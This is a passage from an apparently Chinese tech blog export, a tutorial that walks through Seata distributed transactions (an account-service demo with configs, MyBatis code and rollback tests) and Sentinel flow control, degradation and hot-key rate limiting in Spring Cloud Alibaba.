Exception &#123; SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); &#125; &#125; 11.主启动 123456789101112131415161718192021222324package com.kayleh.springcloud.alibaba; import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;import org.springframework.cloud.openfeign.EnableFeignClients; import java.util.ArrayList;import java.util.Arrays;import java.util.List;import java.util.concurrent.ForkJoinWorkerThread; @SpringBootApplication(exclude = DataSourceAutoConfiguration.class)@EnableDiscoveryClient@EnableFeignClientspublic class SeataStorageServiceApplication2002&#123; public static void main(String[] args) &#123; SpringApplication.run(SeataStorageServiceApplication2002.class, args); &#125;&#125; 新建账户Account-Module1.seata-account-service2003 2.POM 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;dependencies&gt; &lt;!--nacos--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--seata--&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-seata&lt;/artifactId&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.seata&lt;/groupId&gt; &lt;artifactId&gt;seata-all&lt;/artifactId&gt; &lt;version&gt;0.9.0&lt;/version&gt; &lt;/dependency&gt; &lt;!--feign--&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.mybatis.spring.boot&lt;/groupId&gt; &lt;artifactId&gt;mybatis-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;2.0.0&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;mysql&lt;/groupId&gt; &lt;artifactId&gt;mysql-connector-java&lt;/artifactId&gt; &lt;version&gt;5.1.37&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;version&gt;1.1.10&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 3.YML 123456789101112131415161718192021222324252627282930server: port: 2003 spring: application: name: seata-account-service cloud: alibaba: seata: tx-service-group: fsp_tx_group nacos: discovery: server-addr: localhost:8848 datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:mysql://localhost:3306/seata_account username: root password: 1111111 feign: hystrix: enabled: false logging: level: io: seata: info mybatis: mapperLocations: classpath:mapper/*.xml 4.file.conf 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140transport &#123; # tcp udt unix-domain-socket type = \"TCP\" #NIO NATIVE server = \"NIO\" #enable heartbeat heartbeat = true #thread factory for netty thread-factory &#123; boss-thread-prefix = \"NettyBoss\" worker-thread-prefix = \"NettyServerNIOWorker\" server-executor-thread-prefix = \"NettyServerBizHandler\" share-boss-worker = false client-selector-thread-prefix = \"NettyClientSelector\" client-selector-thread-size = 1 client-worker-thread-prefix = \"NettyClientWorkerThread\" # netty boss thread size,will not be used for UDT boss-thread-size = 1 #auto default pin or 8 worker-thread-size = 8 &#125; shutdown &#123; # when destroy server, wait seconds wait = 3 &#125; serialization = \"seata\" compressor = \"none\"&#125; service &#123; vgroup_mapping.fsp_tx_group = \"default\" #修改自定义事务组名称 default.grouplist = \"127.0.0.1:8091\" enableDegrade = false disable = false max.commit.retry.timeout = \"-1\" max.rollback.retry.timeout = \"-1\" disableGlobalTransaction = false&#125; client &#123; async.commit.buffer.limit = 10000 lock &#123; retry.internal = 10 retry.times = 30 &#125; report.retry.count = 5 tm.commit.retry.count = 1 tm.rollback.retry.count = 1&#125; ## transaction log storestore &#123; ## store mode: file、db mode = \"db\" ## file store file &#123; dir = \"sessionStore\" # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions max-branch-session-size = 16384 # globe session size , if exceeded throws exceptions max-global-session-size = 512 # file buffer size , if exceeded allocate new buffer file-write-buffer-cache-size = 16384 # when recover batch read size session.reload.read_size = 100 # async, sync flush-disk-mode = async &#125; ## database store db &#123; ## the implement of javax.sql.DataSource, such as DruidDataSource(druid)/BasicDataSource(dbcp) etc. datasource = \"dbcp\" ## mysql/oracle/h2/oceanbase etc. db-type = \"mysql\" driver-class-name = \"com.mysql.jdbc.Driver\" url = \"jdbc:mysql://127.0.0.1:3306/seata\" user = \"root\" password = \"123456\" min-conn = 1 max-conn = 3 global.table = \"global_table\" branch.table = \"branch_table\" lock-table = \"lock_table\" query-limit = 100 &#125;&#125;lock &#123; ## the lock store mode: local、remote mode = \"remote\" local &#123; ## store locks in user's database &#125; remote &#123; ## store locks in the seata's server &#125;&#125;recovery &#123; #schedule committing retry period in milliseconds committing-retry-period = 1000 #schedule asyn committing retry period in milliseconds asyn-committing-retry-period = 1000 #schedule rollbacking retry period in milliseconds rollbacking-retry-period = 1000 #schedule timeout retry period in milliseconds timeout-retry-period = 1000&#125; transaction &#123; undo.data.validation = true undo.log.serialization = \"jackson\" undo.log.save.days = 7 #schedule delete expired undo_log in milliseconds undo.log.delete.period = 86400000 undo.log.table = \"undo_log\"&#125; ## metrics settingsmetrics &#123; enabled = false registry-type = \"compact\" # multi exporters use comma divided exporter-list = \"prometheus\" exporter-prometheus-port = 9898&#125; support &#123; ## spring spring &#123; # auto proxy the DataSource bean datasource.autoproxy = false &#125;&#125; 5.registry.conf 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273registry &#123; # file 、nacos 、eureka、redis、zk、consul、etcd3、sofa type = \"nacos\" nacos &#123; serverAddr = \"localhost:8848\" namespace = \"\" cluster = \"default\" &#125; eureka &#123; serviceUrl = \"http://localhost:8761/eureka\" application = \"default\" weight = \"1\" &#125; redis &#123; serverAddr = \"localhost:6379\" db = \"0\" &#125; zk &#123; cluster = \"default\" serverAddr = \"127.0.0.1:2181\" session.timeout = 6000 connect.timeout = 2000 &#125; consul &#123; cluster = \"default\" serverAddr = \"127.0.0.1:8500\" &#125; etcd3 &#123; cluster = \"default\" serverAddr = \"http://localhost:2379\" &#125; sofa &#123; serverAddr = \"127.0.0.1:9603\" application = \"default\" region = \"DEFAULT_ZONE\" datacenter = \"DefaultDataCenter\" cluster = \"default\" group = \"SEATA_GROUP\" addressWaitTime = \"3000\" &#125; file &#123; name = \"file.conf\" &#125;&#125; config &#123; # file、nacos 、apollo、zk、consul、etcd3 type = \"file\" nacos &#123; serverAddr = \"localhost\" namespace = \"\" &#125; consul &#123; serverAddr = \"127.0.0.1:8500\" &#125; apollo &#123; app.id = \"seata-server\" apollo.meta = \"http://192.168.1.204:8801\" &#125; zk &#123; serverAddr = \"127.0.0.1:2181\" session.timeout = 6000 connect.timeout = 2000 &#125; etcd3 &#123; serverAddr = \"http://localhost:2379\" &#125; file &#123; name = \"file.conf\" &#125;&#125; 6.domain CommonResult 123456789101112131415161718192021package com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor; @Data@AllArgsConstructor@NoArgsConstructorpublic class CommonResult&lt;T&gt;&#123; private Integer code; private String message; private T data; public CommonResult(Integer code, String message) &#123; this(code,message,null); &#125;&#125; Account 1234567891011121314151617181920212223242526272829303132333435package com.kayleh.springcloud.alibaba.domain; import lombok.AllArgsConstructor;import lombok.Data;import lombok.NoArgsConstructor; import java.math.BigDecimal; @Data@AllArgsConstructor@NoArgsConstructorpublic class Account &#123; private Long id; /** * 用户id */ private Long userId; /** * 总额度 */ private BigDecimal total; /** * 已用额度 */ private BigDecimal used; /** * 剩余额度 */ private BigDecimal residue;&#125; 7.Dao接口及实现 AccountDao 1234567891011121314151617package com.kayleh.springcloud.alibaba.dao; import org.apache.ibatis.annotations.Mapper;import org.apache.ibatis.annotations.Param;import org.springframework.stereotype.Component;import org.springframework.stereotype.Repository; import java.math.BigDecimal; @Mapperpublic interface AccountDao &#123; /** * 扣减账户余额 */ void decrease(@Param(\"userId\") Long userId, @Param(\"money\") BigDecimal money);&#125; resources文件夹下新建mapper文件夹后添加 AccountMapper.xml 123456789101112131415161718192021&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;!DOCTYPE mapper PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\" \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\" &gt; &lt;mapper namespace=\"com.kayleh.springcloud.alibaba.dao.AccountDao\"&gt; &lt;resultMap id=\"BaseResultMap\" type=\"com.kayleh.springcloud.alibaba.domain.Account\"&gt; &lt;id column=\"id\" property=\"id\" jdbcType=\"BIGINT\"/&gt; &lt;result column=\"user_id\" property=\"userId\" jdbcType=\"BIGINT\"/&gt; &lt;result column=\"total\" property=\"total\" jdbcType=\"DECIMAL\"/&gt; &lt;result column=\"used\" property=\"used\" jdbcType=\"DECIMAL\"/&gt; &lt;result column=\"residue\" property=\"residue\" jdbcType=\"DECIMAL\"/&gt; &lt;/resultMap&gt; &lt;update id=\"decrease\"&gt; UPDATE t_account SET residue = residue - #&#123;money&#125;,used = used + #&#123;money&#125; WHERE user_id = #&#123;userId&#125;; &lt;/update&gt;&lt;/mapper&gt; 8.Service接口及实现 AccountService 123456789101112131415package com.kayleh.springcloud.alibaba.service; import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.ResponseBody; import java.math.BigDecimal; public interface AccountService &#123; /** * 扣减账户余额 */ void decrease(@RequestParam(\"userId\") Long userId, @RequestParam(\"money\") BigDecimal money);&#125; AccountServiceImpl 1234567891011121314151617181920212223242526272829303132333435363738package com.kayleh.springcloud.alibaba.service.impl; import com.kayleh.springcloud.alibaba.dao.AccountDao;import com.kayleh.springcloud.alibaba.service.AccountService ;import org.slf4j.Logger;import org.slf4j.LoggerFactory;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.stereotype.Service; import javax.annotation.Resource;import java.math.BigDecimal;import java.util.concurrent.TimeUnit; /** * 账户业务实现类 */@Servicepublic class AccountServiceImpl implements AccountService &#123; private static final Logger LOGGER = LoggerFactory.getLogger(AccountServiceImpl.class); @Resource AccountDao accountDao; /** * 扣减账户余额 */ @Override public void decrease(Long userId, BigDecimal money) &#123; LOGGER.info(\"-------&gt;account-service中扣减账户余额开始\"); try &#123; TimeUnit.SECONDS.sleep(20); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; accountDao.decrease(userId,money); LOGGER.info(\"-------&gt;account-service中扣减账户余额结束\"); &#125;&#125; 9.Controller 12345678910111213141516171819202122232425262728package com.kayleh.springcloud.alibaba.controller; import com.kayleh.springcloud.alibaba.domain.CommonResult ;import com.kayleh.springcloud.alibaba.service.AccountService ;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController; import javax.annotation.Resource;import java.math.BigDecimal; @RestControllerpublic class AccountController &#123; @Resource AccountService accountService; /** * 扣减账户余额 */ @RequestMapping(\"/account/decrease\") public CommonResult decrease(@RequestParam(\"userId\") Long userId, @RequestParam(\"money\") BigDecimal money)&#123; accountService.decrease(userId,money); return new CommonResult(200,\"扣减账户余额成功！\"); &#125;&#125; 10.Config配置 MyBatisConfig 12345678910package com.kayleh.springcloud.alibaba.config; import org.mybatis.spring.annotation.MapperScan;import org.springframework.context.annotation.Configuration; @Configuration@MapperScan(&#123;\"com.kayleh.springcloud.alibaba.dao\"&#125;)public class MyBatisConfig &#123; &#125; DataSourceProxyConfig 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.kayleh.springcloud.alibaba.config; import com.alibaba.druid.pool.DruidDataSource;import io.seata.rm.datasource.DataSourceProxy;import org.apache.ibatis.session.SqlSessionFactory;import org.mybatis.spring.SqlSessionFactoryBean;import org.mybatis.spring.transaction.SpringManagedTransactionFactory;import org.springframework.beans.factory.annotation.Value;import org.springframework.boot.context.properties.ConfigurationProperties;import org.springframework.context.annotation.Bean;import org.springframework.context.annotation.Configuration;import org.springframework.core.io.support.PathMatchingResourcePatternResolver; import javax.sql.DataSource; @Configurationpublic class DataSourceProxyConfig &#123; @Value(\"$&#123;mybatis.mapperLocations&#125;\") private String mapperLocations; @Bean @ConfigurationProperties(prefix = \"spring.datasource\") public DataSource druidDataSource()&#123; return new DruidDataSource(); &#125; @Bean public DataSourceProxy dataSourceProxy(DataSource dataSource) &#123; return new DataSourceProxy(dataSource); &#125; @Bean public SqlSessionFactory sqlSessionFactoryBean(DataSourceProxy dataSourceProxy) throws Exception &#123; SqlSessionFactoryBean sqlSessionFactoryBean = new SqlSessionFactoryBean(); sqlSessionFactoryBean.setDataSource(dataSourceProxy); sqlSessionFactoryBean.setMapperLocations(new PathMatchingResourcePatternResolver().getResources(mapperLocations)); sqlSessionFactoryBean.setTransactionFactory(new SpringManagedTransactionFactory()); return sqlSessionFactoryBean.getObject(); &#125; &#125; 11.主启动 12345678910111213141516171819package com.kayleh.springcloud.alibaba; import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.boot.autoconfigure.jdbc.DataSourceAutoConfiguration;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;import org.springframework.cloud.openfeign.EnableFeignClients; @SpringBootApplication(exclude = DataSourceAutoConfiguration.class)@EnableDiscoveryClient@EnableFeignClientspublic class SeataAccountMainApp2003&#123; public static void main(String[] args) &#123; SpringApplication.run(SeataAccountMainApp2003.class, args); &#125;&#125; Test下订单-&gt;减库存-&gt;扣余额-&gt;改（订单）状态 数据库初始情况 正常下单 http://localhost:2001/order/create?userid=1&amp;producrid=1&amp;counr=10&amp;money=100 数据库情况 超时异常，没加@GlobalTransactionalseata-order-service2003的decrease 123456在accountDao调用decrease之前try&#123; TimeUnit.SECONDS.sleep(20);&#125;catch(InterruptException e)&#123; e.printStackTrace();&#125; AccountServiceImpl添加超时 数据库情况 故障情况 当库存和账户余额扣减后，订单状态并没有设置为已经完成，没有从零改为1 而且由于feign的重试机制，账户余额还有可能被多次扣减 超时异常，添加@GlobalTransactionalorderServiceImpl 1@GlobalTransactional(name = \"fsp-create-order\",rollbackFor = Exception.class) AccountServiceImpl添加超时 OrderServiceImpl@GlobalTransactional 下单后数据库数据并没有任何改变 记录都添加不进来 Seata之原理简介Seata 2019年1月份蚂蚁金服和阿里巴巴共同开源的分布式事务解决方案 Simple Extensible Autonomous Transaction Architecture,简单可扩展自治事务框架 2020起初，参加工作后用1.0以后的版本 再看TC/TM/RM三大组件 分布式事务的执行流程 TM开启分布式事务(TM向TC注册全局事务记录) 换业务场景，编排数据库，服务等事务内资源（RM向TC汇报资源准备状态） TM结束分布式事务，事务一阶段结束（TM通知TC提交/回滚分布式事务） TC汇总事务信息，决定分布式事务是提交还是回滚 TC通知所有RM提交/回滚资源，事务二阶段结束。 AT模式如何做到对业务的无侵入是什么 一阶段加载 二阶段提交 二阶段回滚 debug 补充","categories":[{"name":"分布式","slug":"分布式","permalink":"https://kayleh.top/categories/%E5%88%86%E5%B8%83%E5%BC%8F/"}],"tags":[{"name":"DistributedMicroservices","slug":"DistributedMicroservices","permalink":"https://kayleh.top/tags/DistributedMicroservices/"}]},{"title":"Sentinel实现熔断与限流","slug":"Sentinel实现熔断与限流","date":"2020-08-24T05:18:27.000Z","updated":"2021-04-11T17:11:28.416Z","comments":true,"path":"sentinel-realizes-fusing-and-current-limiting/","link":"","permalink":"https://kayleh.top/sentinel-realizes-fusing-and-current-limiting/","excerpt":"Sentinel","text":"Sentinel 是什么Hystrix 下载https://github.com/alibaba/Sentinel/releases 怎么使用？https://spring-cloud-alibaba-group.github.io/github-pages/greenwich/spring-cloud-alibaba.html#_spring_cloud_alibaba_sentinel 服务使用中的各种问题 服务雪崩 服务降级 服务熔断 服务限流 安装Sentinel控制台sentinel组件由2部分组成 后台 前台8080 安装步骤下载 https://github.com/alibaba/Sentinel/releases 下载到本地sentinel-dashboard-1.7.0.jar 运行命令前提: java8环境OK 8080端口不能被占用 命令: 1java -jar sentinel-dashboard-1.7.0.jar 访问sentinel管理界面 http://localhost:8080 登录账号密码均为sentinel 初始化演示工程启动Nacos8848成功 http://localhost:8848/nacos/#/login Modulecloudalibaba-sentinel-service8401POM1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;com.atguigu.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.csp&lt;/groupId&gt; &lt;artifactId&gt;sentinel-datasource-nacos&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-sentinel&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-actuator&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-devtools&lt;/artifactId&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;cn.hutool&lt;/groupId&gt; &lt;artifactId&gt;hutool-all&lt;/artifactId&gt; &lt;version&gt;4.6.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.projectlombok&lt;/groupId&gt; &lt;artifactId&gt;lombok&lt;/artifactId&gt; &lt;optional&gt;true&lt;/optional&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-test&lt;/artifactId&gt; &lt;scope&gt;test&lt;/scope&gt; &lt;/dependency&gt; &lt;/dependencies&gt; YML123456789101112131415161718192021server: port: 8401spring: application: name: cloudalibaba-sentinel-service cloud: nacos: discovery: #nacos服务注册中心地址 server-addr: localhost:8848 sentinel: transport: dashboard: localhost:8080 port: 8719 #默认8719，假如被占用了会自动从8719开始依次+1扫描。直至找到未被占用的端口management: endpoints: web: exposure: include: '*' 主启动123456789101112131415package com.atguigu.springcloud.alibaba;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;@EnableDiscoveryClient@SpringBootApplicationpublic class MainApp8401&#123; public static void main(String[] args) &#123; SpringApplication.run(MainApp8401.class, args); &#125;&#125; 业务类FlowLimitController12345678910111213141516171819package com.atguigu.springcloud.alibaba.controller;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class FlowLimitController&#123; @GetMapping(\"/testA\") public String testA() &#123; return \"------testA\"; &#125; @GetMapping(\"/testB\") public String testB() &#123; return \"------testB\"; &#125;&#125; 启动Sentinel80801java -jar sentinel-dashboard-1.7.0 启动微服务8401启动8401微服务后查看sentienl控制台空空如也，啥都没有 Sentinel采用的懒加载说明执行一次访问即可 http://localhost:8401/testA http://localhost:8401/testB 效果 结论sentinel8080正在监控微服务8401 流控规则基本介绍 进一步解释说明 流控模式直接（默认）直接-&gt;快速失败 系统默认 配置及说明测试1快速点击访问http:&#x2F;&#x2F;localhost:8401&#x2F;testA 结果 Blocked by Sentinel (flow limiting) 思考？？？ 直接调用默认报错信息，技术方面OK but，是否应该有我们自己的后续处理？ 类似有一个fallback的兜底方法？ 关联是什么？当关联的资源达到阈值时，就限流自己 当与A关联的资源B达到阈值后，就限流自己 B惹事，A挂了 配置A postman模拟并发密集访问testB先把请求save as，保存到Collections 访问testB成功 postman里新建多线程集合组 将访问地址添加进新线程组 Run 大批量线程高并发访问B，导致A失效了 运行后发现testA挂了 点击访问http://localhost:8401/testA 结果 Blocked by Sentinel (flow limiting) 链路多个请求调用了同一个微服务 家庭作业试试 流控效果直接-&gt;快速失败（默认的流控处理）直接失败，抛出异常 Blocked by Sentinel (flow limiting) 源码 com.alibaba.csp.sentinel.slots.block.flow.controller.DefaultController 预热说明 公式：阈值除以coldFactor（默认值为3），经过预热时长后才会达到阈值 官网 默认coldFactor为3，即请求QPS从threshold/3开始，经预热时长逐渐升至设定的QPS阈值。 限流 冷启动 https://github.com/alibaba/Sentinel/wiki/%E9%99%90%E6%B5%81---%E5%86%B7%E5%90%AF%E5%8A%A8 源码com.alibaba.csp.sentinel.slots.block.flow.controller.WarmUpController Warmup配置 多次点击http://localhost:8401/testB 刚开始不行，后续慢慢OK 应用场景 排队等待 匀速排队，阈值必须设置为QPS官网源码com.alibaba.csp.sentinel.slots.block.flow.controller.RateLimiterController 测试testB在控制台输出日志sl4j 1log.info(thread.currentThread.getName()+\"\\t\"+\"...testB\") 降级规则基本介绍 进一步说明 Sentinel的断路器是没有半开状态的 半开的状态系统自动去检测是否请求有异常，没有异常就关闭断路器恢复使用，有异常则继续打开断路器不可用。具体可以参考Hystrix 复习Hystrix 降级策略实战RT是什么? 测试代码 12345678@GetMapping(\"/testD\")public String testD()&#123; try &#123; TimeUnit.SECONDS.sleep(1); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; log.info(\"testD 测试RT\"); return \"------testD\";&#125; 配置 jmeter压测 结论 异常比例是什么 测试 代码 12345678@GetMapping(\"/testD\") public String testD() &#123; log.info(\"testD 测试RT\"); int age = 10/0; return \"------testD\"; &#125; 配置 jmeter 结论 异常数是什么 异常数是按照分钟统计的 测试 代码 1234567@GetMapping(\"/testE\")public String testE()&#123; log.info(\"testE 测试异常数\"); int age = 10/0; return \"------testE 测试异常数\";&#125; 配置 http://localhost:8401/testE jmeter 热点key限流基本介绍是什么 https://github.com/alibaba/Sentinel/wiki/热点参数限流 承上启下复习start @SentinelResource 代码123456789101112@GetMapping(\"/testHotKey\")@SentinelResource(value = \"testHotKey\",blockHandler = \"deal_testHotKey\")public String testHotKey(@RequestParam(value = \"p1\",required = false) String p1, @RequestParam(value = \"p2\",required = false) String p2) &#123; //int age = 10/0; return \"------testHotKey\";&#125; //兜底方法public String deal_testHotKey (String p1, String p2, BlockException exception)&#123; return \"------deal_testHotKey,o(╥﹏╥)o\"; &#125; com.alibaba.csp.sentinel.slots.block.BlockException 配置配置 1 @SentinelResource(value = “testHotKey”) 异常打到了前台用户界面看不到，不友好 2 @SentinelResource(value = “testHotKey”,blockHandler = “deal_testHotKey”) 方法testHostKey里面第一个参数只要QPS超过每秒1次，马上降级处理 用了我们自己定义的 测试 :x: error 1http://localhost:8401/testHotKey?p1=abc :x: error 1http://localhost:8401/testHotKey?p1=abc&amp;p2=33 :heavy_check_mark: right 1http://localhost:8401/testHotKey?p2=abc 参数例外项上述案例演示了第一个参数p1,当QPS超过1秒1次点击后马上被限流 特殊情况 普通 超过1秒钟一个后，达到阈值1后马上被限流 我们期望p1参数当它是某个特殊值时，它的限流值和平时不一样 特例 假如当p1的值等于5时，它的阈值可以达到200 配置 添加按钮不能忘 测试 :heavy_check_mark: http://localhost:8401/testHotKey?p1=5 :x:http://localhost:8401/testHotKey?p1=3 当p1等于5的时候，阈值变为200 当p1不等于5的时候，阈值就是平常的1 前提条件热点参数的注意点，参数必须是基本类型或者String 其他,添加异常看看…. 系统规则是什么？ https://github.com/alibaba/Sentinel/wiki/%E7%B3%BB%E7%BB%9F%E8%87%AA%E9%80%82%E5%BA%94%E9%99%90%E6%B5%81 各项配置参数说明 配置全局QPS @SentinelResource按资源名称限流+后续处理启动Nacos成功 启动Sentinel成功 Module cloudalibaba-sentinel-service8401 POM 12345&lt;dependency&gt; &lt;groupId&gt;com.atguigu.springcloud&lt;/groupId&gt; &lt;artifactId&gt;cloud-api-commons&lt;/artifactId&gt; &lt;version&gt;$&#123;project.version&#125;&lt;/version&gt;&lt;/dependency&gt; yml 1234567891011121314151617181920server: port: 8401spring: application: name: cloudalibaba-sentinel-service cloud: nacos: discovery: server-addr: localhost:8848 sentinel: transport: dashboard: localhost:8080 port: 8719 #默认8719，假如被占用了会自动从8719开始依次+1扫描。直至找到未被占用的端口management: endpoints: web: exposure: include: '*' 业务类RateLimitController 1234567891011121314151617181920212223package com.atguigu.springcloud.alibaba.controller;import com.alibaba.csp.sentinel.annotation.SentinelResource;import com.alibaba.csp.sentinel.slots.block.BlockException;import com.atguigu.springcloud.entities.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RestController;@RestControllerpublic class RateLimitController&#123; @GetMapping(\"/byResource\") @SentinelResource(value = \"byResource\",blockHandler = \"handleException\") public CommonResult byResource() &#123; return new CommonResult(200,\"按资源名称限流测试OK\",new Payment(2020L,\"serial001\")); &#125; public CommonResult handleException(BlockException exception) &#123; return new CommonResult(444,exception.getClass().getCanonicalName()+\"\\t 服务不可用\"); &#125; 主启动 12345678910111213141516package com.atguigu.springcloud.alibaba;import org.springframework.boot.SpringApplication;import org.springframework.boot.autoconfigure.SpringBootApplication;import org.springframework.cloud.client.discovery.EnableDiscoveryClient;@EnableDiscoveryClient@SpringBootApplicationpublic class MainApp8401&#123; public static void main(String[] args) &#123; SpringApplication.run(MainApp8401.class, args); &#125;&#125; 配置流控规则 配置步骤 图形配置和代码关系 表示1秒钟内查询次数大于1，就跑到我们自定义的处流，限流 测试 1秒钟点击1下，OK 超过上述问题，疯狂点击，返回了自己定义的限流处理信息，限流发送 额外问题 此时关闭微服务8401看看 Sentinel控制台，流控规则消失了？？ 临时/持久？ 按照Url地址限流+后续处理通过访问的URL来限流，会返回Sentinel自带默认的限流处理信息 业务类RateLimitController 123456@GetMapping(\"/rateLimit/byUrl\")@SentinelResource(value = \"byUrl\")public CommonResult byUrl()&#123; return new CommonResult(200,\"按url限流测试OK\",new Payment(2020L,\"serial002\"));&#125; 访问一次 Sentinel控制台配置 测试 疯狂点击http://localhost:8401/rateLimit/byUrl 上面兜底方法面临的问题 客户自定义限流处理逻辑创建customerBlockHandler类用于自定义限流处理逻辑 自定义限流处理类 CustomerBlockHandler 123456789101112package com.atguigu.springcloud.alibaba.myhandler;import com.alibaba.csp.sentinel.slots.block.BlockException;import com.atguigu.springcloud.entities.*;public class CustomerBlockHandler &#123; public static CommonResult handleException(BlockException exception) &#123; return new CommonResult(2020, \"自定义限流处理信息....CustomerBlockHandler\"); &#125;&#125; RateLimitController 12345678@GetMapping(\"/rateLimit/customerBlockHandler\")@SentinelResource(value = \"customerBlockHandler\", blockHandlerClass = CustomerBlockHandler.class, blockHandler = \"handlerException2\")public CommonResult customerBlockHandler()&#123; return new CommonResult(200,\"按客戶自定义\",new Payment(2020L,\"serial003\"));&#125; 启动微服务后先调用一次 http://localhost:8401/rateLimit/customerBlockHandler Sentinel控制台配置 测试后我们自定义的出来了 进一步说明: 更多注解属性说明 多说一句 Sentinel主要有三个核心API SphU定义资源 Tracer定义统计 ContextUtil定义了上下文 服务熔断功能sentinel整合ribbon+openFeign+fallbackRibbon系列启动nacos和sentinel提供者9003/9004 新建cloudalibaba-provider-payment9003/9004 POM 1234567891011121314151617181920212223242526272829303132333435363738&lt;dependencies&gt; &lt;!--SpringCloud ailibaba nacos --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-starter-alibaba-nacos-discovery&lt;/artifactId&gt; &lt;/dependency&gt; 